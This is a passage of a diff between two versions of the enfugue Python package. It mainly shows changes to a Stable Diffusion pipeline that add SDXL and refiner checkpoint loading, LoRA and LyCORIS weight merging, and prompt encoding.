@@ -252,17 +250,15 @@
                 pass
 
             for result in all_results:
                 result_deserialized = Serializer.deserialize(result)
                 try:
                     if result_deserialized["id"] == id:
                         if "error" in result_deserialized:
-                            to_raise = resolve(result_deserialized["error"])(
-                                result_deserialized["message"]
-                            )
+                            to_raise = resolve(result_deserialized["error"])(result_deserialized["message"])
                             if "trace" in result_deserialized:
                                 logger.error(result_deserialized["trace"])
                         else:
                             to_return = result_deserialized["result"]
                     else:
                         self.results.put_nowait(result)
                 except:
@@ -273,25 +269,21 @@
             if to_return is not None:
                 return to_return
 
             time.sleep(poll_delay_seconds)
             if timeout is not None and (datetime.datetime.now() - start).total_seconds() > timeout:
                 raise TimeoutError("Timed out waiting for response.")
 
-    def invoke(
-        self, action: str, payload: Any = None, timeout: Optional[Union[int, float]] = None
-    ) -> Any:
+    def invoke(self, action: str, payload: Any = None, timeout: Optional[Union[int, float]] = None) -> Any:
         """
         Issue a single request synchronously using arg syntax.
         """
         return self.wait(self.dispatch(action, payload), timeout)
 
-    def execute(
-        self, plan: DiffusionPlan, timeout: Optional[Union[int, float]] = None, wait: bool = False
-    ) -> Any:
+    def execute(self, plan: DiffusionPlan, timeout: Optional[Union[int, float]] = None, wait: bool = False) -> Any:
         """
         This is a helpful method to just serialize and execute a plan.
         """
         id = self.dispatch("plan", plan.get_serialization_dict())
         if wait:
             return self.wait(id, timeout)
         return id
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/pipeline.py` & `enfugue-0.2.0/enfugue/diffusion/pipeline.py`

 * *Files 24% similar despite different names*

```diff
@@ -11,53 +11,64 @@
     Tuple,
     Iterator,
     Literal,
     Mapping,
     cast,
 )
 
+import os
 import PIL
 import PIL.Image
 import math
 import torch
-import safetensors.torch
+import inspect
 import datetime
 import numpy as np
+import safetensors.torch
 
 from contextlib import contextmanager
 from collections import defaultdict
 
 from transformers import (
     AutoFeatureExtractor,
     CLIPImageProcessor,
     CLIPTextModel,
+    CLIPTextModelWithProjection,
     CLIPTokenizer,
 )
 from diffusers.schedulers import (
     KarrasDiffusionSchedulers,
     DDIMScheduler,
     DPMSolverMultistepScheduler,
     EulerAncestralDiscreteScheduler,
     EulerDiscreteScheduler,
     HeunDiscreteScheduler,
     LMSDiscreteScheduler,
     PNDMScheduler,
 )
 from diffusers.models import AutoencoderKL, UNet2DConditionModel, ControlNetModel
+from diffusers.loaders import LoraLoaderMixin
+from diffusers.models.attention_processor import (
+    AttnProcessor2_0,
+    LoRAAttnProcessor2_0,
+    LoRAXFormersAttnProcessor,
+    XFormersAttnProcessor,
+)
 from diffusers.pipelines.stable_diffusion import (
     StableDiffusionPipeline,
     StableDiffusionPipelineOutput,
     StableDiffusionSafetyChecker,
 )
 from diffusers.pipelines.stable_diffusion.convert_from_ckpt import (
     create_unet_diffusers_config,
     create_vae_diffusers_config,
     convert_ldm_unet_checkpoint,
     convert_ldm_vae_checkpoint,
     convert_ldm_clip_checkpoint,
+    convert_open_clip_checkpoint,
 )
 
 from diffusers.utils import randn_tensor, PIL_INTERPOLATION
 from diffusers.image_processor import VaeImageProcessor
 
 from enfugue.util import logger, check_download_to_dir
 
@@ -72,81 +83,120 @@
     2. img2img
     3. inpainting/outpainting
     4. controlnet
     5. tensorrt
     """
 
     controlnet: Optional[ControlNetModel]
-    scheduler: DDIMScheduler  # Must use DDIM for multi-diffusion
 
     def __init__(
         self,
         vae: AutoencoderKL,
         text_encoder: CLIPTextModel,
+        text_encoder_2: Optional[CLIPTextModelWithProjection],
         tokenizer: CLIPTokenizer,
+        tokenizer_2: Optional[CLIPTokenizer],
         unet: UNet2DConditionModel,
         controlnet: Optional[ControlNetModel],
         scheduler: KarrasDiffusionSchedulers,
-        safety_checker: StableDiffusionSafetyChecker,
+        safety_checker: Optional[StableDiffusionSafetyChecker],
         feature_extractor: CLIPImageProcessor,
+        multi_scheduler: Optional[KarrasDiffusionSchedulers] = None,
         requires_safety_checker: bool = True,
+        force_zeros_for_empty_prompt: bool = True,
+        requires_aesthetic_score: bool = False,
         engine_size: int = 512,
-        chunking_size: int = 32,
+        chunking_size: int = 64,
         chunking_blur: int = 64,
     ) -> None:
         super(EnfugueStableDiffusionPipeline, self).__init__(
             vae,
             text_encoder,
             tokenizer,
             unet,
             scheduler,
             safety_checker,
             feature_extractor,
             requires_safety_checker,
         )
-        # Override scheduler to DDIM for multidiffusion
-        self.scheduler = DDIMScheduler.from_config(self.scheduler.config)
+        # Save scheduler config for hotswapping
+        self.scheduler_config = {**dict(scheduler.config)}
 
         # Enfugue engine settings
         self.engine_size = engine_size
         self.chunking_size = chunking_size
         self.chunking_blur = chunking_blur
 
         # Hide tqdm
         self.set_progress_bar_config(disable=True)
 
+        # Add config for xl
+        self.register_to_config(
+            requires_aesthetic_score=requires_aesthetic_score, force_zeros_for_empty_prompt=force_zeros_for_empty_prompt
+        )
+
         # Add an image processor for later
         self.image_processor = VaeImageProcessor(vae_scale_factor=self.vae_scale_factor)
 
-        # Register controlnet, it can be None
-        self.register_modules(controlnet=controlnet)
+        # Add multi-diffusion scheduler which can be changed
+        if multi_scheduler:
+            self.multi_scheduler = multi_scheduler
+            self.multi_scheduler_config = dict(**multi_scheduler.config)
+        else:
+            if not isinstance(scheduler, DDIMScheduler) and not isinstance(scheduler, EulerDiscreteScheduler):
+                logger.info(
+                    f"Default scheduler {type(scheduler).__name__} does not work well with multi-diffusion, setting default to DDIM."
+                )
+                self.multi_scheduler = DDIMScheduler.from_config(self.scheduler_config)
+            else:
+                self.multi_scheduler = scheduler
+            self.multi_scheduler_config = dict(**self.scheduler_config)
+
+        # Register other networks
+        self.register_modules(controlnet=controlnet, text_encoder_2=text_encoder_2, tokenizer_2=tokenizer_2)
+
+    @classmethod
+    def debug_tensors(cls, **kwargs: Union[Dict, List, torch.Tensor]) -> None:
+        """
+        Debug logs tensors.
+        """
+        for key in kwargs:
+            value = kwargs[key]
+            if isinstance(value, list):
+                for i, v in enumerate(value):
+                    cls.debug_tensors(**{f"{key}_{i}": v})
+            elif isinstance(value, dict):
+                for k in value:
+                    cls.debug_tensors(**{f"{key}_{k}": value[k]})
+            else:
+                logger.debug(f"{key} = {value.shape} ({value.dtype})")
 
     @classmethod
     def from_ckpt(
         cls,
         checkpoint_path: str,
         cache_dir: str,
         prediction_type: Optional[str] = None,
         image_size: int = 512,
-        scheduler_type: Literal[
-            "pndm", "lms", "heun", "euler", "euler-ancestral", "dpm", "ddim"
-        ] = "ddim",
+        scheduler_type: Literal["pndm", "lms", "heun", "euler", "euler-ancestral", "dpm", "ddim"] = "ddim",
+        vae_path: Optional[str] = None,
         load_safety_checker: bool = True,
         torch_dtype: Optional[torch.dtype] = None,
         upcast_attention: Optional[bool] = None,
         extract_ema: Optional[bool] = None,
         num_in_channels: Optional[int] = None,
         **kwargs: Any,
     ) -> EnfugueStableDiffusionPipeline:
         """
         Loads a checkpoint into this pipeline.
-        Diffusers' `from_pretrained` lets us pass arbitrary kwargs in, but `7from_ckpt` does not.
+        Diffusers' `from_pretrained` lets us pass arbitrary kwargs in, but `from_ckpt` does not.
         That's why we override it for this method - most of this is copied from
         https://github.com/huggingface/diffusers/blob/49949f321d9b034440b52e54937fd2df3027bf0a/src/diffusers/pipelines/stable_diffusion/convert_from_ckpt.py
         """
+        logger.debug(f"Reading checkpoint file {checkpoint_path}")
         if checkpoint_path.endswith("safetensors"):
             from safetensors import safe_open
 
             checkpoint = {}
             with safe_open(checkpoint_path, framework="pt", device="cpu") as f:
                 for key in f.keys():
                     checkpoint[key] = f.get_tensor(key)
@@ -160,35 +210,49 @@
             global_step = None
 
         # NOTE: this while loop isn't great but this controlnet checkpoint has one additional
         # "state_dict" key https://huggingface.co/thibaud/controlnet-canny-sd21
         while "state_dict" in checkpoint:
             checkpoint = checkpoint["state_dict"]
 
-        key_name = "model.diffusion_model.input_blocks.2.1.transformer_blocks.0.attn2.to_k.weight"
-
-        # model_type = "v1"
-        config_url = "https://raw.githubusercontent.com/CompVis/stable-diffusion/main/configs/stable-diffusion/v1-inference.yaml"
+        key_name_2_1 = "model.diffusion_model.input_blocks.2.1.transformer_blocks.0.attn2.to_k.weight"
+        key_name_xl_base = "conditioner.embedders.1.model.transformer.resblocks.9.mlp.c_proj.bias"
+        key_name_xl_refiner = "conditioner.embedders.0.model.transformer.resblocks.9.mlp.c_proj.bias"
+
+        # SD v1
+        config_url = (
+            "https://raw.githubusercontent.com/CompVis/stable-diffusion/main/configs/stable-diffusion/v1-inference.yaml"
+        )
 
-        if key_name in checkpoint and checkpoint[key_name].shape[-1] == 1024:
-            # model_type = "v2"
+        if key_name_2_1 in checkpoint and checkpoint[key_name_2_1].shape[-1] == 1024:
+            # SD v2.1
             config_url = "https://raw.githubusercontent.com/Stability-AI/stablediffusion/main/configs/stable-diffusion/v2-inference-v.yaml"
 
             if global_step == 110000:
                 # v2.1 needs to upcast attention
                 upcast_attention = True
+        elif key_name_xl_base in checkpoint:
+            # SDXL Base
+            config_url = "https://raw.githubusercontent.com/Stability-AI/generative-models/main/configs/inference/sd_xl_base.yaml"
+        elif key_name_xl_refiner in checkpoint:
+            # SDXL Refiner
+            config_url = "https://raw.githubusercontent.com/Stability-AI/generative-models/main/configs/inference/sd_xl_refiner.yaml"
 
         original_config_file = check_download_to_dir(config_url, cache_dir, check_size=False)
-
         from omegaconf import OmegaConf
 
         original_config = OmegaConf.load(original_config_file)
 
         if num_in_channels is not None:
-            original_config["model"]["params"]["unet_config"]["params"]["in_channels"] = num_in_channels  # type: ignore
+            if "unet_config" in original_config["model"]["params"]:  # type: ignore
+                # SD 1 or 2
+                original_config["model"]["params"]["unet_config"]["params"]["in_channels"] = num_in_channels  # type: ignore
+            elif "network_config" in original_config["model"]["params"]:  # type: ignore
+                # SDXL
+                original_config["model"]["params"]["network_config"]["params"]["in_channels"] = num_in_channels  # type: ignore
 
         if (
             "parameterization" in original_config["model"]["params"]  # type: ignore
             and original_config["model"]["params"]["parameterization"] == "v"  # type: ignore
         ):
             if prediction_type is None:
                 # NOTE: For stable diffusion 2 base it is recommended to pass `prediction_type=="epsilon"`
@@ -200,28 +264,62 @@
                 image_size = 512 if global_step == 875000 else 768  # type: ignore[unreachable]
         else:
             if prediction_type is None:
                 prediction_type = "epsilon"
             if image_size is None:
                 image_size = 512  # type: ignore[unreachable]
 
-        num_train_timesteps = original_config.model.params.timesteps
-        beta_start = original_config.model.params.linear_start
-        beta_end = original_config.model.params.linear_end
-
-        scheduler = DDIMScheduler(
-            beta_end=beta_end,
-            beta_schedule="scaled_linear",
-            beta_start=beta_start,
-            num_train_timesteps=num_train_timesteps,
-            steps_offset=1,
-            clip_sample=False,
-            set_alpha_to_one=False,
-            prediction_type=prediction_type,
-        )
+        model_type = None
+        if (
+            "cond_stage_config" in original_config.model.params
+            and original_config.model.params.cond_stage_config is not None
+        ):
+            model_type = original_config.model.params.cond_stage_config.target.split(".")[-1]
+        elif original_config.model.params.network_config is not None:
+            if original_config.model.params.network_config.params.context_dim == 2048:
+                model_type = "SDXL"
+            else:
+                model_type = "SDXL-Refiner"
+
+        num_train_timesteps = 1000  # Default is SDXL
+        if "timesteps" in original_config.model.params:
+            # SD 1 or 2
+            num_train_timesteps = original_config.model.params.timesteps
+
+        if model_type in ["SDXL", "SDXL-Refiner"]:
+            image_size = 1024
+            scheduler_dict = {
+                "beta_schedule": "scaled_linear",
+                "beta_start": 0.00085,
+                "beta_end": 0.012,
+                "interpolation_type": "linear",
+                "num_train_timesteps": num_train_timesteps,
+                "prediction_type": "epsilon",
+                "sample_max_value": 1.0,
+                "set_alpha_to_one": False,
+                "skip_prk_steps": True,
+                "steps_offset": 1,
+                "timestep_spacing": "leading",
+            }
+            scheduler = EulerDiscreteScheduler.from_config(scheduler_dict)
+            scheduler_type = "euler"
+            vae_path = "stabilityai/sdxl-vae"
+        else:
+            beta_start = original_config.model.params.linear_start
+            beta_end = original_config.model.params.linear_end
+            scheduler = DDIMScheduler(
+                beta_end=beta_end,
+                beta_schedule="scaled_linear",
+                beta_start=beta_start,
+                num_train_timesteps=num_train_timesteps,
+                steps_offset=1,
+                clip_sample=False,
+                set_alpha_to_one=False,
+                prediction_type=prediction_type,
+            )
 
         # make sure scheduler works correctly with DDIM
         scheduler.register_to_config(clip_sample=False)
 
         if scheduler_type == "pndm":
             config = dict(scheduler.config)
             config["skip_prk_steps"] = True
@@ -248,68 +346,314 @@
         converted_unet_checkpoint = convert_ldm_unet_checkpoint(
             checkpoint, unet_config, path=checkpoint_path, extract_ema=extract_ema
         )
 
         unet.load_state_dict(converted_unet_checkpoint)
 
         # Convert the VAE model.
-        vae_config = create_vae_diffusers_config(original_config, image_size=image_size)
-        converted_vae_checkpoint = convert_ldm_vae_checkpoint(checkpoint, vae_config)
+        if vae_path is None:
+            vae_config = create_vae_diffusers_config(original_config, image_size=image_size)
+            converted_vae_checkpoint = convert_ldm_vae_checkpoint(checkpoint, vae_config)
 
-        vae = AutoencoderKL(**vae_config)
-        vae.load_state_dict(converted_vae_checkpoint)
-
-        # Convert the text model.
-        model_type = original_config.model.params.cond_stage_config.target.split(".")[-1]
-        if model_type != "FrozenCLIPEmbedder":
-            raise ValueError("Enfugue currently only supports Stable Diffusion 1.5")
-
-        text_model = convert_ldm_clip_checkpoint(checkpoint)
-        tokenizer = CLIPTokenizer.from_pretrained("openai/clip-vit-large-patch14")
+            vae = AutoencoderKL(**vae_config)
+            vae.load_state_dict(converted_vae_checkpoint)
+        else:
+            vae = AutoencoderKL.from_pretrained(vae_path, cache_dir=cache_dir)
 
         if load_safety_checker:
-            safety_checker = StableDiffusionSafetyChecker.from_pretrained(
-                "CompVis/stable-diffusion-safety-checker"
-            )
-            feature_extractor = AutoFeatureExtractor.from_pretrained(
-                "CompVis/stable-diffusion-safety-checker"
-            )
+            safety_checker = StableDiffusionSafetyChecker.from_pretrained("CompVis/stable-diffusion-safety-checker")
+            feature_extractor = AutoFeatureExtractor.from_pretrained("CompVis/stable-diffusion-safety-checker")
         else:
             safety_checker = None
             feature_extractor = None
 
-        pipe = cls(
-            vae=vae,
-            text_encoder=text_model,
-            tokenizer=tokenizer,
-            unet=unet,
-            scheduler=scheduler,
-            safety_checker=safety_checker,
-            feature_extractor=feature_extractor,
-            **kwargs,
-        )
+        # Convert the text model.
+        if model_type == "FrozenCLIPEmbedder":
+            logger.debug("Using Stable Diffusion v1 pipeline.")
+            text_model = convert_ldm_clip_checkpoint(checkpoint)
+            tokenizer = CLIPTokenizer.from_pretrained("openai/clip-vit-large-patch14")
+            kwargs["text_encoder_2"] = None
+            kwargs["tokenizer_2"] = None
+            pipe = cls(
+                vae=vae,
+                text_encoder=text_model,
+                tokenizer=tokenizer,
+                unet=unet,
+                scheduler=scheduler,
+                safety_checker=safety_checker,
+                feature_extractor=feature_extractor,
+                **kwargs,
+            )
+        elif model_type == "SDXL":
+            logger.debug("Using Stable Diffusion XL pipeline.")
+            tokenizer = CLIPTokenizer.from_pretrained("openai/clip-vit-large-patch14")
+            text_encoder = convert_ldm_clip_checkpoint(checkpoint)
+            tokenizer_2 = CLIPTokenizer.from_pretrained("laion/CLIP-ViT-bigG-14-laion2B-39B-b160k", pad_token="!")
+
+            text_encoder_2 = convert_open_clip_checkpoint(
+                checkpoint,
+                "laion/CLIP-ViT-bigG-14-laion2B-39B-b160k",
+                prefix="conditioner.embedders.1.model.",
+                has_projection=True,
+                projection_dim=1280,
+            )
+            pipe = cls(
+                vae=vae,
+                text_encoder=text_encoder,
+                text_encoder_2=text_encoder_2,
+                tokenizer=tokenizer,
+                tokenizer_2=tokenizer_2,
+                unet=unet,
+                scheduler=scheduler,
+                safety_checker=safety_checker,
+                feature_extractor=feature_extractor,
+                force_zeros_for_empty_prompt=True,
+                **kwargs,
+            )
+        elif model_type == "SDXL-Refiner":
+            logger.debug("Using Stable Diffusion XL refiner pipeline.")
+            tokenizer_2 = CLIPTokenizer.from_pretrained("laion/CLIP-ViT-bigG-14-laion2B-39B-b160k", pad_token="!")
+            text_encoder_2 = convert_open_clip_checkpoint(
+                checkpoint,
+                "laion/CLIP-ViT-bigG-14-laion2B-39B-b160k",
+                prefix="conditioner.embedders.0.model.",
+                has_projection=True,
+                projection_dim=1280,
+            )
+            pipe = cls(
+                vae=vae,
+                text_encoder=None,
+                text_encoder_2=text_encoder_2,
+                tokenizer=None,
+                tokenizer_2=tokenizer_2,
+                unet=unet,
+                scheduler=scheduler,
+                safety_checker=safety_checker,
+                feature_extractor=feature_extractor,
+                force_zeros_for_empty_prompt=False,
+                requires_aesthetic_score=True,
+                **kwargs,
+            )
+        else:
+            raise ValueError(f"Unsupported model type {model_type}")
         if torch_dtype is not None:
             return pipe.to(torch_dtype=torch_dtype)
         return pipe
 
+    @property
+    def is_sdxl(self) -> bool:
+        """
+        Returns true if this is using SDXL
+        """
+        return self.tokenizer_2 is not None and self.text_encoder_2 is not None
+
+    def encode_prompt(
+        self,
+        prompt: Optional[str],
+        device: torch.device,
+        num_images_per_prompt: int = 1,
+        do_classifier_free_guidance: bool = False,
+        negative_prompt: Optional[str] = None,
+        prompt_embeds: Optional[torch.Tensor] = None,
+        negative_prompt_embeds: Optional[torch.Tensor] = None,
+        lora_scale: Optional[float] = None,
+    ) -> Union[torch.Tensor, Tuple[torch.Tensor, torch.Tensor, torch.Tensor, torch.Tensor]]:
+        """
+        Encodes the prompt into text encoder hidden states.
+        See https://github.com/huggingface/diffusers/blob/main/src/diffusers/pipelines/stable_diffusion_xl/pipeline_stable_diffusion_xl.py
+        """
+        # set lora scale so that monkey patched LoRA
+        # function of text encoder can correctly access it
+        if lora_scale is not None and isinstance(self, LoraLoaderMixin):
+            self._lora_scale = lora_scale
+
+        # Define tokenizers and text encoders
+        # We can tell what kind of pipeline we're doing here using this matrix:
+        # | tokenizer | tokenizer_2 | text_encoder | text_encoder_2 | pipeline |
+        # | --------- | ----------- | ------------ | -------------- | -------- |
+        # | yes       | no          | yes          | no             | SD       |
+        # | no        | yes         | no           | yes            | SDXL-R   |
+        # | yes       | yes         | yes          | yes            | SDXL     |
+
+        tokenizers = []
+        if self.tokenizer:
+            tokenizers.append(self.tokenizer)
+        if self.tokenizer_2:
+            tokenizers.append(self.tokenizer_2)
+
+        text_encoders = []
+        if self.text_encoder:
+            text_encoders.append(self.text_encoder.to(device=device, dtype=self.text_encoder.dtype))
+        if self.text_encoder_2:
+            text_encoders.append(self.text_encoder_2.to(device=device, dtype=self.text_encoder_2.dtype))
+
+        if prompt_embeds is None:
+            prompt_embeds_list = []
+            for tokenizer, text_encoder in zip(tokenizers, text_encoders):
+                text_inputs = tokenizer(
+                    prompt,
+                    padding="max_length",
+                    max_length=tokenizer.model_max_length,
+                    truncation=True,
+                    return_tensors="pt",
+                )
+                text_input_ids = text_inputs.input_ids
+                untruncated_ids = tokenizer(prompt, padding="longest", return_tensors="pt").input_ids
+
+                if untruncated_ids.shape[-1] >= text_input_ids.shape[-1] and not torch.equal(
+                    text_input_ids, untruncated_ids
+                ):
+                    removed_text = tokenizer.batch_decode(untruncated_ids[:, tokenizer.model_max_length - 1 : -1])
+                    logger.warning(
+                        "The following part of your input was truncated because CLIP can only handle sequences up to"
+                        f" {tokenizer.model_max_length} tokens: {removed_text}"
+                    )
+
+                if (
+                    not self.is_sdxl
+                    and hasattr(text_encoder.config, "use_attention_mask")
+                    and text_encoder.config.use_attention_mask
+                ):
+                    attention_mask = text_inputs.attention_mask.to(device)
+                else:
+                    attention_mask = None
+
+                text_input_ids = text_input_ids.to(device=device)
+                prompt_embeds = text_encoder(
+                    text_input_ids, output_hidden_states=self.is_sdxl, attention_mask=attention_mask
+                )
+
+                if self.is_sdxl:
+                    pooled_prompt_embeds = prompt_embeds[0]  # type: ignore
+                    prompt_embeds = prompt_embeds.hidden_states[-2]  # type: ignore
+                else:
+                    prompt_embeds = prompt_embeds[0].to(dtype=self.text_encoder.dtype, device=device)  # type: ignore
+
+                bs_embed, seq_len, _ = prompt_embeds.shape  # type: ignore
+                # duplicate text embeddings for each generation per prompt, using mps friendly method
+                prompt_embeds = prompt_embeds.repeat(1, num_images_per_prompt, 1)  # type: ignore
+                prompt_embeds = prompt_embeds.view(bs_embed * num_images_per_prompt, seq_len, -1)
+
+                if self.is_sdxl:
+                    prompt_embeds_list.append(prompt_embeds)
+            if self.is_sdxl:
+                prompt_embeds = torch.concat(prompt_embeds_list, dim=-1)
+
+        # get unconditional embeddings for classifier free guidance
+        zero_out_negative_prompt = negative_prompt is None and self.config.force_zeros_for_empty_prompt
+        if self.is_sdxl and do_classifier_free_guidance and negative_prompt_embeds is None and zero_out_negative_prompt:
+            negative_prompt_embeds = torch.zeros_like(prompt_embeds)  # type: ignore
+            negative_pooled_prompt_embeds = torch.zeros_like(pooled_prompt_embeds)
+        elif do_classifier_free_guidance and negative_prompt_embeds is None:
+            uncond_tokens: List[str] = [negative_prompt or ""]
+            negative_prompt_embeds_list = []
+
+            for tokenizer, text_encoder in zip(tokenizers, text_encoders):
+                max_length = prompt_embeds.shape[1]  # type: ignore
+                uncond_input = tokenizer(
+                    uncond_tokens,
+                    padding="max_length",
+                    max_length=max_length,
+                    truncation=True,
+                    return_tensors="pt",
+                )
+
+                if (
+                    not self.is_sdxl
+                    and hasattr(text_encoder.config, "use_attention_mask")
+                    and text_encoder.config.use_attention_mask
+                ):
+                    attention_mask = text_inputs.attention_mask.to(device)
+                else:
+                    attention_mask = None
+
+                negative_prompt_embeds = text_encoder(
+                    uncond_input.input_ids.to(device), output_hidden_states=self.is_sdxl, attention_mask=attention_mask
+                )
+
+                if self.is_sdxl:
+                    # We are only ALWAYS interested in the pooled output of the final text encoder
+                    negative_pooled_prompt_embeds = negative_prompt_embeds[0]  # type: ignore
+                    negative_prompt_embeds = negative_prompt_embeds.hidden_states[-2]  # type: ignore
+                else:
+                    negative_prompt_embeds = negative_prompt_embeds[0]  # type: ignore
+
+                if do_classifier_free_guidance:
+                    # duplicate unconditional embeddings for each generation per prompt, using mps friendly method
+                    seq_len = negative_prompt_embeds.shape[1]  # type: ignore
+
+                    negative_prompt_embeds = negative_prompt_embeds.to(dtype=text_encoder.dtype, device=device)  # type: ignore
+
+                    negative_prompt_embeds = negative_prompt_embeds.repeat(1, num_images_per_prompt, 1)
+                    negative_prompt_embeds = negative_prompt_embeds.view(num_images_per_prompt, seq_len, -1)
+
+                    # For classifier free guidance, we need to do two forward passes.
+                    # Here we concatenate the unconditional and text embeddings into a single batch
+                    # to avoid doing two forward passes
+                    if not self.is_sdxl:
+                        prompt_embeds = torch.cat([negative_prompt_embeds, prompt_embeds])  # type: ignore
+                if self.is_sdxl:
+                    negative_prompt_embeds_list.append(negative_prompt_embeds)
+            if self.is_sdxl:
+                negative_prompt_embeds = torch.concat(negative_prompt_embeds_list, dim=-1)
+
+        if self.is_sdxl:
+            pooled_prompt_embeds = pooled_prompt_embeds.repeat(1, num_images_per_prompt).view(
+                bs_embed * num_images_per_prompt, -1
+            )
+            negative_pooled_prompt_embeds = negative_pooled_prompt_embeds.repeat(1, num_images_per_prompt).view(
+                bs_embed * num_images_per_prompt, -1
+            )
+            return prompt_embeds, negative_prompt_embeds, pooled_prompt_embeds, negative_pooled_prompt_embeds  # type: ignore
+        return prompt_embeds  # type: ignore
+
     @contextmanager
-    def get_runtime_context(
-        self, batch_size: int, device: Union[str, torch.device]
-    ) -> Iterator[None]:
+    def get_runtime_context(self, batch_size: int, device: Union[str, torch.device]) -> Iterator[None]:
         """
         Used by other implementations (tensorrt), but not base.
         """
         if isinstance(device, str):
             device = torch.device(device)
+        self.unet.to(device)
+        self.vae.to(device)
+        if self.text_encoder is not None:
+            self.text_encoder.to(device)
+        if self.text_encoder_2 is not None:
+            self.text_encoder_2.to(device)
+        if self.controlnet is not None:
+            self.controlnet.to(device)
         if device.type == "cpu":
             with torch.autocast("cpu"):
                 yield
         else:
             yield
 
+    def load_lycoris_weights(
+        self,
+        weights_path: str,
+        multiplier: int = 1,
+        dtype: torch.dtype = torch.float32,
+        **kwargs: Any,
+    ) -> None:
+        """
+        Loads lycoris weights using the official package
+        """
+        name, ext = os.path.splitext(os.path.basename(weights_path))
+        if ext == ".safetensors":
+            state_dict = safetensors.torch.load_file(weights_path, device="cpu")
+        else:
+            state_dict = torch.load(weights_path, map_location="cpu")
+
+        while "state_dict" in state_dict:
+            state_dict = state_dict["state_dict"]
+
+        from lycoris.utils import merge
+
+        merge((self.text_encoder, self.vae, self.unet), state_dict, multiplier, device="cpu")
+
     def load_lora_weights(
         self,
         pretrained_model_name_or_path_or_dict: Union[str, Dict[str, torch.Tensor]],
         multiplier: int = 1,
         dtype: torch.dtype = torch.float32,
         **kwargs: Any,
     ) -> None:
@@ -323,17 +667,15 @@
                 pretrained_model_name_or_path_or_dict, **kwargs
             )
 
         LORA_PREFIX_UNET = "lora_unet"
         LORA_PREFIX_TEXT_ENCODER = "lora_te"
 
         # load LoRA weight from .safetensors
-        state_dict = safetensors.torch.load_file(
-            pretrained_model_name_or_path_or_dict, device="cpu"
-        )
+        state_dict = safetensors.torch.load_file(pretrained_model_name_or_path_or_dict, device="cpu")
 
         updates: Mapping[str, Any] = defaultdict(dict)
         for key, value in state_dict.items():
             # it is suggested to print out the key, it usually will be something like below
             # "lora_te_text_model_encoder_layers_0_self_attn_k_proj.lora_down.weight"
 
             layer, elem = key.split(".", 1)
@@ -389,15 +731,14 @@
 
     def denormalize_latents(self, latents: torch.Tensor) -> torch.Tensor:
         """
         Denomalizes image data from [-1, 1] to [0, 1]
         """
         return (latents / 2 + 0.5).clamp(0, 1)
 
-    @torch.no_grad()
     def prepare_mask_and_image(
         self,
         mask: Union[np.ndarray, PIL.Image.Image, torch.Tensor],
         image: Union[np.ndarray, PIL.Image.Image, torch.Tensor],
     ) -> Tuple[torch.Tensor, torch.Tensor]:
         """
         Prepares a mask and image for inpainting.
@@ -422,17 +763,15 @@
                     mask = mask.unsqueeze(0)
 
                 # Batched masks no channel dim
                 else:
                     mask = mask.unsqueeze(1)
 
             assert image.ndim == 4 and mask.ndim == 4, "Image and Mask must have 4 dimensions"
-            assert (
-                image.shape[-2:] == mask.shape[-2:]
-            ), "Image and Mask must have the same spatial dimensions"
+            assert image.shape[-2:] == mask.shape[-2:], "Image and Mask must have the same spatial dimensions"
             assert image.shape[0] == mask.shape[0], "Image and Mask must have the same batch size"
 
             # Check image is in [-1, 1]
             if image.min() < -1 or image.max() > 1:
                 raise ValueError("Image should be in [-1, 1] range")
 
             # Check mask is in [0, 1]
@@ -462,79 +801,85 @@
             image = torch.from_numpy(image).to(dtype=torch.float32) / 127.5 - 1.0
 
             # preprocess mask
             if isinstance(mask, (PIL.Image.Image, np.ndarray)):
                 mask = [mask]
 
             if isinstance(mask, list) and isinstance(mask[0], PIL.Image.Image):
-                mask = np.concatenate(
-                    [np.array(m.convert("L"))[None, None, :] for m in mask], axis=0
-                )
+                mask = np.concatenate([np.array(m.convert("L"))[None, None, :] for m in mask], axis=0)
                 mask = mask.astype(np.float32) / 255.0
             elif isinstance(mask, list) and isinstance(mask[0], np.ndarray):
                 mask = np.concatenate([m[None, None, :] for m in mask], axis=0)
 
             mask[mask < 0.5] = 0
             mask[mask >= 0.5] = 1
             mask = torch.from_numpy(mask)
 
         masked_image = image * (mask < 0.5)
 
         return mask, masked_image
 
-    @torch.no_grad()
     def create_latents(
         self,
         batch_size: int,
         num_channels_latents: int,
         height: int,
         width: int,
         dtype: torch.dtype,
         device: Union[str, torch.device],
         generator: Optional[torch.Generator] = None,
+        scheduler: Optional[KarrasDiffusionSchedulers] = None,
     ) -> torch.Tensor:
         """
         Creates random latents of a particular shape and type.
         """
         shape = (
             batch_size,
             num_channels_latents,
             height // self.vae_scale_factor,
             width // self.vae_scale_factor,
         )
         logger.debug(f"Creating random latents of shape {shape} and type {dtype}")
         random_latents = randn_tensor(shape, generator=generator, device=device, dtype=dtype)
-        return random_latents * self.scheduler.init_noise_sigma
+        if scheduler is None:
+            scheduler = self.scheduler
+        return random_latents * scheduler.init_noise_sigma
 
-    @torch.no_grad()
     def encode_image_unchunked(
-        self, image: torch.Tensor, generator: Optional[torch.Generator] = None
+        self, image: torch.Tensor, dtype: torch.dtype, generator: Optional[torch.Generator] = None
     ) -> torch.Tensor:
         """
         Encodes an image without chunking using the VAE.
         """
-        return self.vae.encode(image).latent_dist.sample(generator) * self.vae.config.scaling_factor
+        logger.debug("Encoding image (unchunked).")
+        if self.is_sdxl:
+            self.vae.to(dtype=torch.float32)
+            image = image.float()
+        latents = self.vae.encode(image).latent_dist.sample(generator) * self.vae.config.scaling_factor
+        if self.is_sdxl:
+            self.vae.to(dtype=dtype)
+        return latents.to(dtype=dtype)
 
-    @torch.no_grad()
     def encode_image(
         self,
         image: torch.Tensor,
         device: Union[str, torch.device],
+        dtype: torch.dtype,
         generator: Optional[torch.Generator] = None,
         progress_callback: Optional[Callable[[], None]] = None,
     ) -> torch.Tensor:
         """
         Encodes an image in chunks using the VAE.
         """
         _, _, height, width = image.shape
         chunks = self.get_chunks(height, width)
         total_steps = len(chunks)
 
         if total_steps == 1:
-            result = self.encode_image_unchunked(image, generator)
+            result = self.encode_image_unchunked(image, dtype, generator)
             if progress_callback is not None:
                 progress_callback()
             return result
 
         logger.debug(f"Encoding image in {total_steps} steps.")
 
         latent_height = height // self.vae_scale_factor
@@ -542,14 +887,19 @@
 
         engine_latent_size = self.engine_size // self.vae_scale_factor
         num_channels = self.vae.config.latent_channels
 
         count = torch.zeros((1, num_channels, latent_height, latent_width)).to(device=device)
         value = torch.zeros_like(count)
 
+        if self.is_sdxl:
+            self.vae.to(dtype=torch.float32)
+            image = image.float()
+        else:
+            self.vae.to(dtype=image.dtype)
